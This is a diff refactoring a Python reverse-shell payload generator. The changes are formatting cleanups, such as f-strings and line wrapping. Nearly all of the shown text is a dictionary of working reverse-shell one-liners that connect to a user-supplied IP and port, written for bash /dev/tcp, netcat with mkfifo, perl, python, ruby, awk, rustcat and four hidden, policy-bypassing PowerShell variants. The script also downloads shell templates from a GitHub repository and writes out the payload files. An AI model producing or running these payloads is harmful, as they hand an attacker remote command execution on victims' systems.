@@ -74,29 +74,36 @@ url3 = "https://github.com/ElMehdi-Chbani/Reverse-Shells/raw/main/shell.java"
 
 # Define a dictionary for different shell commands
 shell_commands = {
-    "awk": 'awk \'BEGIN {s = "/inet/tcp/0/%s/%s"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null' % (IP, PORT),
-    "ruby": 'ruby -rsocket -e \'spawn("sh",[:in,:out,:err]=>TCPSocket.new("%s",%s))\'' % (IP, PORT),
-    "rustcat": "rcat {} {} -r undefined".format(IP, PORT),
-    "bash": "bash -i >& /dev/tcp/{}/{} 0>&1".format(IP, PORT),
-    "mfikto": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {} {} >/tmp/f".format(IP, PORT),
-    "netcat": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(IP, PORT),
-    "perl-no-sh": 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"%s:%s");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'' % (IP, PORT),
-    "perl": 'perl -e \'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("undefined -i");}};\'' % (IP, PORT),
-    "python": 'export RHOST="%s";export RPORT=%s;python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\'' % (IP, PORT),
-    "python2": 'export RHOST="%s";export RPORT=%s;python2.7 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\'' % (IP, PORT),
-    "python3": 'export RHOST="%s";export RPORT=%s;python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\'' % (IP, PORT),
-    "powershell-1": f'powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'{IP}\',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"',
-    "powershell-2": f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient(\'{IP}\',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
-    "powershell-3": f'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'{IP}\', {PORT});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()}}WriteToStream \'\';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()"',
-    "powershell-4": f'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'{IP}\', {PORT}); $NetworkStream = $TCPClient.GetStream(); $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({{$true}} -as [Net.Security.RemoteCertificateValidationCallback])); $SslStream.AuthenticateAsClient(\'cloudflare-dns.com\', $null, $false); if (!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{ $SslStream.Close(); exit }} $StreamWriter = New-Object IO.StreamWriter($SslStream); function WriteToStream ($String) {{ [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{ 0 }}; $StreamWriter.Write($String + \'SHELL> \'); $StreamWriter.Flush() }}; WriteToStream ''; while (($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{ $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); $Output = try {{ Invoke-Expression $Command 2>&1 | Out-String }} catch {{ $_ | Out-String }} WriteToStream ($Output) }} $StreamWriter.Close()"'
+    "awk": 'awk \'BEGIN {s = "/inet/tcp/0/%s/%s"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null'
+    % (IP, PORT),
+    "ruby": 'ruby -rsocket -e \'spawn("sh",[:in,:out,:err]=>TCPSocket.new("%s",%s))\''
+    % (IP, PORT),
+    "rustcat": f"rcat {IP} {PORT} -r undefined",
+    "bash": f"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
+    "mfikto": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {IP} {PORT} >/tmp/f",
+    "netcat": f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f",
+    "perl-no-sh": 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"%s:%s");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''
+    % (IP, PORT),
+    "perl": 'perl -e \'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("undefined -i");}};\''
+    % (IP, PORT),
+    "python": 'export RHOST="%s";export RPORT=%s;python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\''
+    % (IP, PORT),
+    "python2": 'export RHOST="%s";export RPORT=%s;python2.7 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\''
+    % (IP, PORT),
+    "python3": 'export RHOST="%s";export RPORT=%s;python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\''
+    % (IP, PORT),
+    "powershell-1": f"""powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'{IP}\',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"""",
+    "powershell-2": f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient(\'{IP}\',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"""",
+    "powershell-3": f"""powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'{IP}\', {PORT});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()}}WriteToStream \'\';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()\"""",
+    "powershell-4": f"""powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'{IP}\', {PORT}); $NetworkStream = $TCPClient.GetStream(); $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({{$true}} -as [Net.Security.RemoteCertificateValidationCallback])); $SslStream.AuthenticateAsClient(\'cloudflare-dns.com\', $null, $false); if (!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{ $SslStream.Close(); exit }} $StreamWriter = New-Object IO.StreamWriter($SslStream); function WriteToStream ($String) {{ [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{ 0 }}; $StreamWriter.Write($String + \'SHELL> \'); $StreamWriter.Flush() }}; WriteToStream ; while (($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{ $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); $Output = try {{ Invoke-Expression $Command 2>&1 | Out-String }} catch {{ $_ | Out-String }} WriteToStream ($Output) }} $StreamWriter.Close()\"""",
 }
 
-# CHOOSING VERSION LANGUAGE 
+# CHOOSING VERSION LANGUAGE
 if EXTENSION == "powershell":
     print("  ~) -"+color(" PowerShell-1         ",(CYAN))+"  ~) - "+color("Powershell-2",(CYAN)))
     print("  ~) -"+color(" PowerShell-3         ",(CYAN))+"  ~) - "+color("Powershell-4 (TLS 'not write TLS')",(CYAN)))
     print("\n")
-    
+
     EX = prompt("What PowerShell Version are you using:: ", completer=completer1).lower()
     EXTENSION = EX
 
@@ -108,7 +115,7 @@ elif EXTENSION == "nodejs":
         # Replace the placeholders in the remote content with user input
         modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
         # Save the modified content to a local file
-        file_path = "{}.{}".format(FILE_NAME,"js")
+        file_path = f"{FILE_NAME}.js"
         with open(file_path, "w") as file:
             file.write(modified_content)
         print(f"The modified file has been saved as {file_path}")
@@ -124,7 +131,7 @@ elif EXTENSION == "java":
         # Replace the placeholders in the remote content with user input
         modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
         # Save the modified content to a local file
-        file_path = "{}.{}".format(FILE_NAME,EXTENSION)
+        file_path = f"{FILE_NAME}.{EXTENSION}"
         with open(file_path, "w") as file:
             file.write(modified_content)
         print(f"The modified file has been saved as {file_path}")
@@ -141,7 +148,7 @@ elif EXTENSION == "groovy":
         # Replace the placeholders in the remote content with user input
         modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
         # Save the modified content to a local file
-        file_path = "{}.{}".format(FILE_NAME,EXTENSION)
+        file_path = f"{FILE_NAME}.{EXTENSION}"
         with open(file_path, "w") as file:
             file.write(modified_content)
 
@@ -174,7 +181,7 @@ elif EXTENSION == "php":
         # Replace the placeholders in the remote content with user input
         modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
         # Save the modified content to a local file
-        file_path = "{}.{}".format(FILE_NAME,EX)
+        file_path = f"{FILE_NAME}.{EX}"
         with open(file_path, "w") as file:
             file.write(modified_content)
 
@@ -190,29 +197,26 @@ format_to_extension = {
     "bash": "sh",
     "perl": "pl",
     "python": "sh",
-    "netcat": "sh",
     "perl-no-sh": "pl",
     "rustcat": "sh",
-    "mfikto" : "sh",
-    "netcat" : "sh",
-    "powershell-1" : "ps1",
-    "powershell-2":"ps2",
-    "powershell-3" : "ps3",
+    "mfikto": "sh",
+    "netcat": "sh",
+    "powershell-1": "ps1",
+    "powershell-2": "ps2",
+    "powershell-3": "ps3",
     "powershell-4": "ps4",
-    "awk":"awk",
-    "ruby":"rb",
+    "awk": "awk",
+    "ruby": "rb",
 }
 
 
 # Check if the entered format is in the dictionary
-if EXTENSION in shell_commands:
-    file_extension = format_to_extension.get(EXTENSION)
-    if file_extension:
-        file_path = "{}.{}".format(FILE_NAME,file_extension)
-        with open(file_path, "w") as file:
-            file.write(shell_commands[EXTENSION])
-            print(f"The modified file has been saved as {file_path}")
-    else:
-        print("Unsupported shell format: {}".format(EXTENSION))
+if EXTENSION in shell_commands and (
+    file_extension := format_to_extension.get(EXTENSION)
+):
+    file_path = f"{FILE_NAME}.{file_extension}"
+    with open(file_path, "w") as file:
+        file.write(shell_commands[EXTENSION])
+        print(f"The modified file has been saved as {file_path}")
 else:
-    print("Unsupported shell format: {}".format(EXTENSION))
+    print(f"Unsupported shell format: {EXTENSION}")
